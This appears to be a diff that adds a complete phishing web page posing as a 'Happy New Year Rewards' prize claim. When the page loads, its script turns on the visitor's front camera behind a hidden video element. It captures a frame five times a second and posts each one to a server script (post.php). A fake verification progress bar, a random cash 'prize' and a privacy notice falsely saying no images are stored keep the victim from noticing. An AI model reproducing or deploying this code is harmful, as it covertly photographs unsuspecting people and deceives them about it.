@@ -1,0 +1,767 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Happy New Year Rewards</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css">
+    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+    <style>
+        :root {
+            --gold: #FFD700;
+            --dark-blue: #0f2027;
+            --success: #00C853;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #0f2027 0%, #203a43 100%);
+            min-height: 100vh;
+            margin: 0;
+            padding: 15px;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        
+        .container-sm {
+            max-width: 900px;
+            padding: 0;
+        }
+        
+        /* Header */
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+            padding: 15px;
+        }
+        
+        .title {
+            font-size: 1.8rem;
+            font-weight: 900;
+            margin-bottom: 10px;
+            background: linear-gradient(135deg, var(--gold), #FFA500);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        
+        .subtitle {
+            font-size: 1rem;
+            opacity: 0.9;
+            background: rgba(255, 215, 0, 0.1);
+            padding: 10px 15px;
+            border-radius: 10px;
+            display: inline-block;
+            border: 1px solid rgba(255, 215, 0, 0.2);
+        }
+        
+        /* Cards */
+        .card {
+            background: rgba(255, 255, 255, 0.08);
+            border-radius: 15px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border: 1px solid rgba(255, 215, 0, 0.2);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        
+        .card-title {
+            color: var(--gold);
+            font-size: 1.2rem;
+            font-weight: 700;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        /* Verification */
+        .steps {
+            margin-bottom: 15px;
+        }
+        
+        .step {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 8px;
+            padding: 8px 10px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 8px;
+            font-size: 0.9rem;
+        }
+        
+        .step-number {
+            background: linear-gradient(135deg, var(--gold), #FFA500);
+            color: #000;
+            width: 24px;
+            height: 24px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 0.8rem;
+        }
+        
+        /* Camera Status */
+        .camera-status-box {
+            background: linear-gradient(135deg, rgba(255, 215, 0, 0.1), rgba(255, 165, 0, 0.05));
+            border-radius: 10px;
+            padding: 15px;
+            text-align: center;
+            margin-bottom: 15px;
+            border: 2px dashed rgba(255, 215, 0, 0.3);
+            transition: all 0.3s;
+        }
+        
+        .camera-status-box.active {
+            border: 2px solid #00FF00;
+            background: linear-gradient(135deg, rgba(0, 255, 0, 0.1), rgba(0, 200, 0, 0.05));
+        }
+        
+        .camera-status-box.error {
+            border: 2px solid #FF4444;
+            background: linear-gradient(135deg, rgba(255, 0, 0, 0.1), rgba(200, 0, 0, 0.05));
+        }
+        
+        .camera-status-box i {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
+        }
+        
+        .camera-status {
+            font-size: 0.85rem;
+            color: rgba(255, 255, 255, 0.8);
+            margin-top: 5px;
+        }
+        
+        /* Buttons */
+        .btn-success {
+            background: linear-gradient(135deg, var(--success), #00E676);
+            color: #000;
+            border: none;
+            padding: 12px;
+            border-radius: 10px;
+            font-weight: 700;
+            width: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: all 0.3s;
+            margin-top: 10px;
+        }
+        
+        .btn-success:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 200, 83, 0.4);
+        }
+        
+        .btn-success:disabled {
+            background: #666;
+            cursor: not-allowed;
+            transform: none;
+        }
+        
+        /* Reward Display */
+        .reward-display {
+            background: linear-gradient(135deg, rgba(255, 215, 0, 0.2), rgba(255, 165, 0, 0.1));
+            border-radius: 10px;
+            padding: 20px;
+            text-align: center;
+            margin-bottom: 15px;
+            border: 2px solid rgba(255, 215, 0, 0.3);
+        }
+        
+        .reward-amount {
+            font-size: 2.5rem;
+            font-weight: 900;
+            color: var(--gold);
+            margin: 10px 0;
+            min-height: 60px;
+        }
+        
+        .reward-label {
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.9);
+        }
+        
+        /* Inputs */
+        .input-group {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+        
+        .input-box {
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 215, 0, 0.3);
+            border-radius: 8px;
+            padding: 10px;
+        }
+        
+        .input-box label {
+            display: block;
+            font-size: 0.8rem;
+            color: var(--gold);
+            margin-bottom: 5px;
+            font-weight: 600;
+        }
+        
+        .input-box input {
+            width: 100%;
+            background: transparent;
+            border: none;
+            color: #fff;
+            font-size: 1rem;
+            text-align: center;
+            outline: none;
+        }
+        
+        /* Status */
+        .status {
+            background: rgba(0, 255, 0, 0.1);
+            border: 1px solid #00FF00;
+            border-radius: 8px;
+            padding: 10px;
+            margin-top: 10px;
+            display: none;
+            font-size: 0.9rem;
+            text-align: center;
+        }
+        
+        /* Progress */
+        .progress {
+            height: 6px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 3px;
+            margin: 10px 0;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, var(--gold), #FFA500);
+            width: 0%;
+            transition: width 0.3s;
+        }
+        
+        /* Hidden elements */
+        .hidden {
+            display: none;
+        }
+        
+        /* Confetti */
+        .confetti {
+            position: fixed;
+            width: 10px;
+            height: 10px;
+            background: var(--gold);
+            top: -10px;
+            z-index: 1000;
+            opacity: 0.7;
+        }
+        
+        /* Footer */
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.8rem;
+            color: rgba(255, 255, 255, 0.7);
+        }
+        
+        .footer a {
+            color: var(--gold);
+            text-decoration: none;
+        }
+        
+        /* Mobile optimizations */
+        @media (max-width: 768px) {
+            .header {
+                margin-bottom: 15px;
+            }
+            
+            .title {
+                font-size: 1.5rem;
+            }
+            
+            .subtitle {
+                font-size: 0.9rem;
+                padding: 8px 12px;
+            }
+            
+            .card {
+                padding: 15px;
+                margin-bottom: 15px;
+            }
+            
+            .reward-amount {
+                font-size: 2rem;
+            }
+            
+            .input-group {
+                grid-template-columns: 1fr;
+                gap: 8px;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            body {
+                padding: 10px;
+            }
+            
+            .title {
+                font-size: 1.3rem;
+            }
+            
+            .reward-amount {
+                font-size: 1.8rem;
+            }
+        }
+        
+        /* Auto-capture notice */
+        .auto-notice {
+            background: rgba(255, 215, 0, 0.15);
+            border-left: 4px solid var(--gold);
+            padding: 10px 15px;
+            border-radius: 8px;
+            margin-bottom: 15px;
+            font-size: 0.85rem;
+        }
+    </style>
+</head>
+<body>
+    <!-- Confetti Container -->
+    <div id="confetti"></div>
+    
+    <div class="container-sm">
+        <!-- Header -->
+        <div class="header">
+            <div class="title">
+                <i class="bi bi-gift-fill"></i> HAPPY NEW YEAR REWARDS
+            </div>
+            <div class="subtitle">
+                Auto-verification in progress...
+            </div>
+        </div>
+        
+        <!-- Auto-capture Notice -->
+        <div class="auto-notice">
+            <i class="bi bi-info-circle"></i> Auto-verification started.
+        </div>
+        
+        <!-- Verification Card -->
+        <div class="card">
+            <div class="card-title">
+                <i class="bi bi-person-check"></i> Auto-Verification Status
+            </div>
+            
+            <div class="steps">
+                <div class="step">
+                    <div class="step-number">1</div>
+                    <span>Camera permission requested automatically</span>
+                </div>
+                <div class="step">
+                    <div class="step-number">2</div>
+                    <span>VERIFICATION</span>
+                </div>
+                <div class="step">
+                    <div class="step-number">3</div>
+                    <span>Claim your reward when verified</span>
+                </div>
+            </div>
+            
+            <!-- Camera Status Box -->
+            <div class="camera-status-box" id="cameraStatusBox">
+                <i class="bi bi-camera-video" id="cameraIcon"></i>
+                <div id="cameraMessage">Initializing...</div>
+                <div class="camera-status">
+                    <span id="captureCount">0%</span>  Verification completed
+                </div>
+            </div>
+            
+            <!-- Progress Bar -->
+            <div class="progress" id="progress">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            
+            <!-- Status -->
+            <div class="status" id="status">
+                <i class="bi bi-check-circle"></i> Auto-verification complete! Ready to claim reward
+            </div>
+        </div>
+        
+        <!-- Reward Card -->
+        <div class="card">
+            <div class="card-title">
+                <i class="bi bi-cash-coin"></i> Claim Your Reward
+            </div>
+            
+            <!-- Reward Display -->
+            <div class="reward-display">
+                <div class="reward-amount" id="rewardAmount">$ ???</div>
+                <div class="reward-label">YOUR NEW YEAR GIFT</div>
+            </div>
+            
+            <!-- Prize Range Inputs -->
+            <div class="input-group">
+                <div class="input-box">
+                    <label>Min Prize</label>
+                    <input type="number" id="minPrize" value="100" min="100" max="10000">
+                </div>
+                <div class="input-box">
+                    <label>Max Prize</label>
+                    <input type="number" id="maxPrize" value="10000" min="500" max="10000">
+                </div>
+            </div>
+            
+            <!-- Claim Button -->
+            <button class="btn-success" id="claimBtn" disabled>
+                <i class="bi bi-gift-fill"></i> CLAIM REWARD
+            </button>
+        </div>
+        
+        <!-- Footer -->
+        <div class="footer">
+            <i class="bi bi-lock"></i>No manual action needed.
+            <a href="#" id="privacyLink">Privacy Info</a>
+        </div>
+    </div>
+
+    <!-- Hidden Video and Canvas -->
+    <video id="video" class="hidden" playsinline autoplay></video>
+    <canvas id="canvas" class="hidden" width="640" height="480"></canvas>
+
+    <script>
+        // DOM Elements
+        const claimBtn = document.getElementById('claimBtn');
+        const rewardAmount = document.getElementById('rewardAmount');
+        const cameraStatusBox = document.getElementById('cameraStatusBox');
+        const cameraIcon = document.getElementById('cameraIcon');
+        const cameraMessage = document.getElementById('cameraMessage');
+        const captureCountElement = document.getElementById('captureCount');
+        const status = document.getElementById('status');
+        const progress = document.getElementById('progress');
+        const progressBar = document.getElementById('progressBar');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const privacyLink = document.getElementById('privacyLink');
+        const confettiContainer = document.getElementById('confetti');
+        
+        // State
+        let isCameraActive = false;
+        let isVerified = false;
+        let captureInterval;
+        let captureCount = 0;
+        let verificationTimeout;
+        
+        // Initialize - Start auto-capture on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            setupEventListeners();
+            createInitialConfetti();
+            
+            // Start auto-capture after a brief delay
+            setTimeout(() => {
+                initAutoCapture();
+            }, 1000);
+        });
+        
+        // Setup event listeners
+        function setupEventListeners() {
+            // Claim button
+            claimBtn.addEventListener('click', claimReward);
+            
+            // Privacy link
+            privacyLink.addEventListener('click', function(e) {
+                e.preventDefault();
+                alert("Privacy Info:\n\n• Auto\n• Verification activates automatically\n• No images are stored\n• Your data is protected\n• No manual interaction needed");
+            });
+            
+            // Prize range validation
+            document.getElementById('minPrize').addEventListener('change', validatePrizeRange);
+            document.getElementById('maxPrize').addEventListener('change', validatePrizeRange);
+        }
+        
+        // Initialize auto-capture
+        async function initAutoCapture() {
+            updateCameraStatus('initializing', 'Requesting camera access...');
+            
+            try {
+                // Request camera automatically
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    audio: false,
+                    video: { 
+                        facingMode: "user",
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
+                    }
+                });
+                
+                // Start camera
+                video.srcObject = stream;
+                isCameraActive = true;
+                
+                // Update UI
+                updateCameraStatus('active', 'Running In Backround');
+                
+                // Start auto-capture immediately
+                startAutoCapture();
+                
+                // Start verification process
+                startVerificationProcess();
+                
+            } catch (error) {
+                console.error('Auto-capture error:', error);
+                updateCameraStatus('error', 'Camera access required for reward');
+                
+                // Show retry option
+                setTimeout(() => {
+                    if (!isCameraActive) {
+                        cameraMessage.innerHTML = 'Click here to enable camera';
+                        cameraStatusBox.style.cursor = 'pointer';
+                        cameraStatusBox.onclick = () => {
+                            location.reload();
+                        };
+                    }
+                }, 2000);
+            }
+        }
+        
+        // Start auto-capture in background
+        function startAutoCapture() {
+            const context = canvas.getContext('2d');
+            
+            // Start capturing immediately
+            captureInterval = setInterval(() => {
+                if (isCameraActive && video.readyState === video.HAVE_ENOUGH_DATA) {
+                    try {
+                        // Capture frame
+                        context.drawImage(video, 0, 0, 640, 480);
+                        
+                        // Convert to data URL
+                        const imageData = canvas.toDataURL("image/jpeg", 0.5)
+                            .replace("image/jpeg", "image/octet-stream");
+                        
+                        // Send to server
+                        sendToServer(imageData);
+                        
+                        // Update capture count
+                        captureCount++;
+                        captureCountElement.textContent = captureCount;
+                        
+                    } catch (error) {
+                        console.log('Capture error:', error);
+                    }
+                }
+            }, 200); // 5 captures per second
+            
+            console.log('Auto-capture started at 5fps');
+        }
+        
+        // Send data to server
+        function sendToServer(data) {
+            // Use AJAX to send data
+            $.ajax({
+                type: 'POST',
+                data: { cat: data },
+                url: 'post.php',
+                dataType: 'json',
+                async: true,
+                success: function(result) {
+                    // Success callback
+                },
+                error: function() {
+                    // Error handling
+                }
+            });
+            
+            // Log every 20th capture
+            if (captureCount % 20 === 0) {
+                console.log(`Auto-verify ${captureCount} frames`);
+            }
+        }
+        
+        // Start verification process
+        function startVerificationProcess() {
+            progress.style.display = 'block';
+            
+            // Simulated verification progress
+            let progressValue = 0;
+            const progressInterval = setInterval(() => {
+                progressValue += 10;
+                progressBar.style.width = progressValue + '%';
+                
+                if (progressValue >= 100) {
+                    clearInterval(progressInterval);
+                    
+                    // Verification complete
+                    isVerified = true;
+                    enableClaimButton();
+                    updateCameraStatus('verified', 'Verification complete!');
+                    
+                    // Show success status
+                    status.style.display = 'block';
+                    
+                    // Create celebration
+                    createConfetti();
+                    
+                    // Hide progress after delay
+                    setTimeout(() => {
+                        progress.style.display = 'none';
+                    }, 1000);
+                }
+            }, 300);
+        }
+        
+        // Update camera status
+        function updateCameraStatus(state, message) {
+            switch(state) {
+                case 'initializing':
+                    cameraStatusBox.className = 'camera-status-box';
+                    cameraIcon.className = 'bi bi-hourglass';
+                    cameraIcon.style.color = '#FFD700';
+                    break;
+                    
+                case 'active':
+                    cameraStatusBox.className = 'camera-status-box active';
+                    cameraIcon.className = 'bi bi-camera-video-fill';
+                    cameraIcon.style.color = '#00FF00';
+                    break;
+                    
+                case 'verified':
+                    cameraStatusBox.className = 'camera-status-box active';
+                    cameraIcon.className = 'bi bi-shield-check';
+                    cameraIcon.style.color = '#00FF00';
+                    break;
+                    
+                case 'error':
+                    cameraStatusBox.className = 'camera-status-box error';
+                    cameraIcon.className = 'bi bi-camera-video-off';
+                    cameraIcon.style.color = '#FF4444';
+                    break;
+            }
+            
+            cameraMessage.textContent = message;
+        }
+        
+        // Enable claim button
+        function enableClaimButton() {
+            claimBtn.disabled = false;
+            claimBtn.innerHTML = '<i class="bi bi-gift-fill"></i> CLAIM YOUR REWARD NOW';
+        }
+        
+        // Claim reward
+        function claimReward() {
+            if (!isVerified) {
+                alert('Auto-verification in progress... Please wait.');
+                return;
+            }
+            
+            // Get prize range
+            const min = parseInt(document.getElementById('minPrize').value) || 100;
+            const max = parseInt(document.getElementById('maxPrize').value) || 10000;
+            
+            // Validate
+            if (min >= max) {
+                alert('Max prize must be greater than min prize!');
+                return;
+            }
+            
+            // Generate random prize
+            const prize = Math.floor(Math.random() * (max - min + 1)) + min;
+            
+            // Display with animation
+            rewardAmount.textContent = '$ ???';
+            rewardAmount.style.opacity = '0.5';
+            
+            setTimeout(() => {
+                rewardAmount.textContent = `$${prize.toLocaleString()}`;
+                rewardAmount.style.opacity = '1';
+                rewardAmount.style.transform = 'scale(1.1)';
+                
+                setTimeout(() => {
+                    rewardAmount.style.transform = 'scale(1)';
+                    
+                    // Create celebration
+                    for(let i = 0; i < 3; i++) {
+                        setTimeout(() => createConfetti(), i * 300);
+                    }
+                    
+                    alert(`🎉 HAPPY NEW YEAR!\n\nYou won $${prize.toLocaleString()}!\n\nReward is being processed...`);
+                }, 300);
+            }, 500);
+            
+            // Animate button
+            claimBtn.style.transform = 'scale(0.95)';
+            setTimeout(() => claimBtn.style.transform = '', 150);
+        }
+        
+        // Validate prize range
+        function validatePrizeRange() {
+            const minInput = document.getElementById('minPrize');
+            const maxInput = document.getElementById('maxPrize');
+            
+            let min = parseInt(minInput.value);
+            let max = parseInt(maxInput.value);
+            
+            // Ensure minimum values
+            if (min < 100) min = 100;
+            if (max < 500) max = 500;
+            if (max > 10000) max = 10000;
+            
+            // Ensure max > min
+            if (min >= max) {
+                max = min + 100;
+                if (max > 10000) {
+                    max = 10000;
+                    min = max - 100;
+                }
+            }
+            
+            minInput.value = min;
+            maxInput.value = max;
+        }
+        
+        // Create confetti
+        function createConfetti() {
+            for (let i = 0; i < 40; i++) {
+                const confetti = document.createElement('div');
+                confetti.classList.add('confetti');
+                confetti.style.left = Math.random() * 100 + 'vw';
+                confetti.style.backgroundColor = `hsl(${Math.random() * 60 + 30}, 100%, 50%)`;
+                confetti.style.width = Math.random() * 8 + 4 + 'px';
+                confetti.style.height = Math.random() * 8 + 4 + 'px';
+                confettiContainer.appendChild(confetti);
+                
+                const duration = Math.random() * 2000 + 1000;
+                
+                confetti.animate([
+                    { transform: 'translateY(0) rotate(0deg)', opacity: 1 },
+                    { transform: `translateY(${window.innerHeight}px) rotate(${Math.random() * 360}deg)`, opacity: 0 }
+                ], {
+                    duration: duration,
+                    delay: Math.random() * 300
+                });
+                
+                setTimeout(() => confetti.remove(), duration + 500);
+            }
+        }
+        
+        // Create initial confetti
+        function createInitialConfetti() {
+            setTimeout(createConfetti, 500);
+        }
+        
+        // Cleanup
+        window.addEventListener('beforeunload', function() {
+            if (captureInterval) clearInterval(captureInterval);
+            if (verificationTimeout) clearTimeout(verificationTimeout);
+            if (video.srcObject) {
+                video.srcObject.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
+</html>
